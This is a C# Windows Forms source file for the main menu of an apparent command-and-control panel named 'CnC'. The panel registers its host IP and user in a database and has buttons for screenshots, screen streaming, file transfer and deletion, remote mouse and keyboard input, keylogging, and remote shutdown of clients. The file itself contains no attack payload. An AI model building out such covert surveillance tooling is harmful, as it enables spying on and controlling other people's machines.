using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace CnC
{
    public partial class MainMenu : Form
    {
        string USER = Properties.Resources.Main_User;
        int TogMove;
        int MValX;
        int MValY;
        public MainMenu()
        {
            InitializeComponent();
        }
        string GetIpAdress()
        {
            IPHostEntry host;
            string localip = "?";
            host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (IPAddress ip in host.AddressList)
            {
                if (ip.AddressFamily.ToString() == "InterNetwork")
                {
                    localip = ip.ToString();
                }
            }
            return localip;
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            try
            {
                CnC_DatabaseDataContext DataBase = new CnC_DatabaseDataContext();
                int iD = 0;
                
                string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;

                var count = (from rows in DataBase.Streaming_IPs
                             where rows.UserType == "Server"
                             select rows).Count();
                if (count > 0)
                {
                    var IPs = (from rows in DataBase.Streaming_IPs
                               where rows.UserType == "Server"
                               select rows).FirstOrDefault();
                    iD = IPs.ID;
                    DataBase.Streaming_IPs.DeleteOnSubmit(IPs);
                    DataBase.SubmitChanges();
                }
                var Count = (from rows in DataBase.Streaming_IPs
                             select rows).Count();
                Streaming_IP IP_Submit = new Streaming_IP();
                IP_Submit.AreOn = "true";
                IP_Submit.ID = iD;
                IP_Submit.IP = GetIpAdress();
                IP_Submit.Port = 2016;
                IP_Submit.User = userName;
                IP_Submit.UserType = "Server";
                DataBase.Streaming_IPs.InsertOnSubmit(IP_Submit);
                DataBase.SubmitChanges();

            }
            catch (Exception ex)
            {

                MessageBox.Show(ex.ToString());
            }
            
        }

        private void dateTimePicker1_ValueChanged(object sender, EventArgs e)
        {

        }

        private void dateTimePicker1_ValueChanged_1(object sender, EventArgs e)
        {

        }

        private void Panel_Closing_MouseDown(object sender, MouseEventArgs e)
        {
            TogMove = 1;
            MValX = e.X;
            MValY = e.Y;
        }

        private void Panel_Closing_MouseUp(object sender, MouseEventArgs e)
        {
            TogMove = 0;
        }

        private void Panel_Closing_MouseMove(object sender, MouseEventArgs e)
        {
            if (TogMove == 1)
            {
                this.SetDesktopLocation(MousePosition.X - MValX, MousePosition.Y - MValY);

            }
        }

        private void Minimize_btn_MouseEnter(object sender, EventArgs e)
        {
            Minimize_btn.Height = 23;
            Minimize_btn.Width = 23;

            Minimize_btn.Location = new Point(Minimize_btn.Location.X + 1, Minimize_btn.Location.Y );
        }

        private void Minimize_btn_MouseLeave(object sender, EventArgs e)
        {
            Minimize_btn.Height = 24;
            Minimize_btn.Width = 24;
            Minimize_btn.Location = new Point(Minimize_btn.Location.X - 1, Minimize_btn.Location.Y );

        }

        private void Close_btn_MouseEnter(object sender, EventArgs e)
        {
            Close_btn.Height = 23;
            Close_btn.Width = 23;
            Close_btn.Location = new Point(Close_btn.Location.X + 1, Close_btn.Location.Y);

        }

        private void Close_btn_MouseLeave(object sender, EventArgs e)
        {
            Close_btn.Height = 24;
            Close_btn.Width = 24;
            Close_btn.Location = new Point(Close_btn.Location.X - 1, Close_btn.Location.Y);

        }

        private void Minimize_btn_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void Close_btn_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void dateTimePicker1_ValueChanged_2(object sender, EventArgs e)
        {

        }

        private void PanelUp_Paint(object sender, PaintEventArgs e)
        {

        }

        private void PanelRight_Paint(object sender, PaintEventArgs e)
        {

        }

        private void PanelDown_Paint(object sender, PaintEventArgs e)
        {

        }

        private void PanelLeft_Paint(object sender, PaintEventArgs e)
        {

        }

        private void panel2_Paint(object sender, PaintEventArgs e)
        {

        }

        private void panel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void Video_MouseEnter(object sender, EventArgs e)
        {
            Video.Height = 49;
            Video.Width = 49;

        }

        private void Video_MouseLeave(object sender, EventArgs e)
        {
            Video.Height = 50;
            Video.Width = 50;

        }

        private void ScreenShot_MouseEnter(object sender, EventArgs e)
        {
            ScreenShot.Height = 49;
            ScreenShot.Width = 49;

        }

        private void ScreenShot_MouseLeave(object sender, EventArgs e)
        {
            ScreenShot.Height = 50;
            ScreenShot.Width = 50;
        }

        private void pictureBox1_MouseEnter(object sender, EventArgs e)
        {
            Streaming.Height = 49;
            Streaming.Width = 49;
        }

        private void Streaming_MouseLeave(object sender, EventArgs e)
        {
            Streaming.Height = 50;
            Streaming.Width = 50;

        }

        private void FileUpload_MouseEnter(object sender, EventArgs e)
        {
            FileUpload.Height = 49;
            FileUpload.Width = 49;

        }

        private void FileUpload_MouseLeave(object sender, EventArgs e)
        {
            FileUpload.Height = 50;
            FileUpload.Width = 50;

        }

        private void FileDownload_MouseEnter(object sender, EventArgs e)
        {
            FileDownload.Height = 49;
            FileDownload.Width = 49;

        }

        private void FileDownload_MouseLeave(object sender, EventArgs e)
        {
            FileDownload.Height = 50;
            FileDownload.Width = 50;
        }

        private void FileDelete_MouseEnter(object sender, EventArgs e)
        {
            FileDelete.Height = 49;
            FileDelete.Width = 49;

        }

        private void FileDelete_MouseLeave(object sender, EventArgs e)
        {
            FileDelete.Height = 50;
            FileDelete.Width = 50;

        }

        private void FileRename_MouseEnter(object sender, EventArgs e)
        {
            FileRename.Height = 49;
            FileRename.Width = 49;

        }

        private void FileRename_MouseLeave(object sender, EventArgs e)
        {
            FileRename.Height = 50;
            FileRename.Width = 50; 
        }

        private void MouseClick_MouseEnter(object sender, EventArgs e)
        {
            MouseClick.Height = 49;
            MouseClick.Width = 49;

        }

        private void MouseClick_MouseLeave(object sender, EventArgs e)
        {
            MouseClick.Height = 50;
            MouseClick.Width = 50;

        }

        private void KeyType_MouseEnter(object sender, EventArgs e)
        {
            KeyType.Height = 49;
            KeyType.Width = 49;

        }

        private void KeyType_MouseLeave(object sender, EventArgs e)
        {
            KeyType.Height = 50;
            KeyType.Width = 50;
        }

        private void LogKeys_MouseEnter(object sender, EventArgs e)
        {
            LogKeys.Height = 49;
            LogKeys.Width = 49;

        }

        private void LogKeys_MouseLeave(object sender, EventArgs e)
        {
            LogKeys.Height = 50;
            LogKeys.Width = 50;

        }

        private void Procces_MouseEnter(object sender, EventArgs e)
        {
            Procces.Height = 49;
            Procces.Width = 49;
        }

        private void Procces_MouseLeave(object sender, EventArgs e)
        {
            Procces.Height = 50;
            Procces.Width = 50;
        }

        private void ShowSite_MouseEnter(object sender, EventArgs e)
        {
            ShowSite.Height = 49;
            ShowSite.Width = 49;

        }

        private void ShowSite_MouseLeave(object sender, EventArgs e)
        {
            ShowSite.Height = 50;

            ShowSite.Width = 50;

        }

        private void BlockSite_MouseEnter(object sender, EventArgs e)
        {
            BlockSite.Height = 49;
            BlockSite.Width = 49;

        }

        private void BlockSite_MouseLeave(object sender, EventArgs e)
        {
            BlockSite.Height = 50;
            BlockSite.Width = 50;

        }

        private void CloseSite_MouseEnter(object sender, EventArgs e)
        {
            CloseSite.Height = 49;
            CloseSite.Width = 49;

        }

        private void CloseSite_MouseLeave(object sender, EventArgs e)
        {
            CloseSite.Height = 50;
            CloseSite.Width = 50;
                
        }

        private void WriteMessage_MouseEnter(object sender, EventArgs e)
        {
            WriteMessage.Height = 49;
            WriteMessage.Width = 49;

        }

        private void WriteMessage_MouseLeave(object sender, EventArgs e)
        {
            WriteMessage.Height = 50;
            WriteMessage.Width = 50;

        }

        private void WarningMessage_MouseEnter(object sender, EventArgs e)
        {
            WarningMessage.Height = 49;
            WarningMessage.Width = 49;

        }

        private void WarningMessage_MouseLeave(object sender, EventArgs e)
        {
            WarningMessage.Height = 50;
            WarningMessage.Width = 50;

        }

        private void DeleteMessage_MouseEnter(object sender, EventArgs e)
        {
            DeleteMessage.Height = 49;
            DeleteMessage.Width = 49;

        }

        private void DeleteMessage_MouseLeave(object sender, EventArgs e)
        {
            DeleteMessage.Height = 50;
            DeleteMessage.Width = 50;

        }

        private void ClientList_MouseEnter(object sender, EventArgs e)
        {
            ClientList.Height = 49;
            ClientList.Width = 49;

        }

        private void ClientList_MouseLeave(object sender, EventArgs e)
        {
            ClientList.Height = 50;
            ClientList.Width = 50;

        }

        private void ClientDelete_MouseEnter(object sender, EventArgs e)
        {
            ClientDelete.Height = 49;
            ClientDelete.Width = 49;

        }

        private void ClientDelete_MouseLeave(object sender, EventArgs e)
        {
            ClientDelete.Height = 50;
            ClientDelete.Width = 50;
        }

        private void ServerDetails_MouseEnter(object sender, EventArgs e)
        {
            ServerDetails.Height = 49;
            ServerDetails.Width = 49;

        }

        private void ServerDetails_MouseLeave(object sender, EventArgs e)
        {
            ServerDetails.Height = 50;
            ServerDetails.Width = 50;

        }

        private void ShutDown_MouseEnter(object sender, EventArgs e)
        {
            ShutDown.Height = 49;
            ShutDown.Width = 49;

        }

        private void ShutDown_MouseLeave(object sender, EventArgs e)
        {
            ShutDown.Height = 50;
            ShutDown.Width = 50;

        }

        private void Restart_MouseEnter(object sender, EventArgs e)
        {
            Restart.Height = 49;
            Restart.Width = 49;

        }

        private void Restart_MouseLeave(object sender, EventArgs e)
        {
            Restart.Height = 50;
            Restart.Width = 50;

        }

        private void LogOff_MouseEnter(object sender, EventArgs e)
        {
            LogOff.Height = 49;
            LogOff.Width = 49;

        }

        private void LogOff_MouseLeave(object sender, EventArgs e)
        {
            LogOff.Height = 50;
            LogOff.Width = 50;

        }

        private void Sleep_MouseEnter(object sender, EventArgs e)
        {
            Sleep.Height = 49;
            Sleep.Width = 49;

        }

        private void Sleep_MouseLeave(object sender, EventArgs e)
        {
            Sleep.Height = 50;
            Sleep.Width = 50;

        }

        private void Setting_MouseEnter(object sender, EventArgs e)
        {
            Setting.Height = 49;
            Setting.Width = 49;

        }

        private void Setting_MouseLeave(object sender, EventArgs e)
        {
            Setting.Height = 50;
            Setting.Width = 50;

        }

        private void ScreenShot_Click(object sender, EventArgs e)
        {
            ScreenShot_Form SS = new ScreenShot_Form();
            SS.Show();
        }

        private void Streaming_Click(object sender, EventArgs e)
        {
            Streaming_Choose Choose = new Streaming_Choose();
            Choose.Show();

        }

        private void FileUpload_Click(object sender, EventArgs e)
        {
            Upload Upload = new Upload();
            Upload.Show();

        }

        private void FileDownload_Click(object sender, EventArgs e)
        {
            DemandFile Demand = new DemandFile();
            Demand.Show();

        }

        private void FileDelete_Click(object sender, EventArgs e)
        {
            DemandDeleteFile DD = new DemandDeleteFile();
            DD.Show();

        }

        private void MouseClick_Click(object sender, EventArgs e)
        {
            MouseClick Click = new MouseClick();
            Click.Show();

        }

        private void KeyType_Click(object sender, EventArgs e)
        {
            Typing Type = new Typing();
            Type.Show();

        }

        private void LogKeys_Click(object sender, EventArgs e)
        {
            KeyLogging Key = new KeyLogging();
            Key.Show();

        }

        private void Procces_Click(object sender, EventArgs e)
        {
            SoftwareProcces Sofware = new SoftwareProcces();
            Sofware.Show();

        }

        private void BlockSite_Click(object sender, EventArgs e)
        {
            SeeUrls Block = new SeeUrls();
            Block.Show();

        }

        private void CloseSite_Click(object sender, EventArgs e)
        {
            SeeUrls Close = new SeeUrls();
            Close.Show();
        }

        private void WriteMessage_Click(object sender, EventArgs e)
        {
            OneMessage Onetime = new OneMessage();
            Onetime.Show();

        }

        private void WarningMessage_Click(object sender, EventArgs e)
        {
            CaseMessages Case = new CaseMessages();
            Case.Show();
        }

        private void DeleteMessage_Click(object sender, EventArgs e)
        {
            DeleteMessages delete = new DeleteMessages();
            delete.Show();

        }

        private void ClientList_Click(object sender, EventArgs e)
        {
            ListClients List = new ListClients();
            List.Which_Form = "0";
            List.Show();
           

        }

        private void ClientDelete_Click(object sender, EventArgs e)
        {
            ListClients List = new ListClients();
            List.Which_Form = "1";
            List.Show();
        }

        private void ServerDetails_Click(object sender, EventArgs e)
        {
            ServerWatch watch = new ServerWatch();
            watch.Show();

        }

        private void pictureBox1_MouseEnter_1(object sender, EventArgs e)
        {
            System.Windows.Forms.PictureBox ThisName = ((PictureBox)sender);
            EnterChangeSize Pic2 = new EnterChangeSize(ThisName);
            Pic2.ChangeSize(49, 49);
        }

        private void WindowsActivity_MouseLeave(object sender, EventArgs e)
        {
            System.Windows.Forms.PictureBox ThisName = ((PictureBox)sender);
            EnterChangeSize Pic2 = new EnterChangeSize(ThisName);
            Pic2.ChangeSize(50, 50);
        }

        private void WindowsActivity_Click(object sender, EventArgs e)
        {
            System_Closing Activuty = new System_Closing();
            Activuty.Show();

        }
    }
}
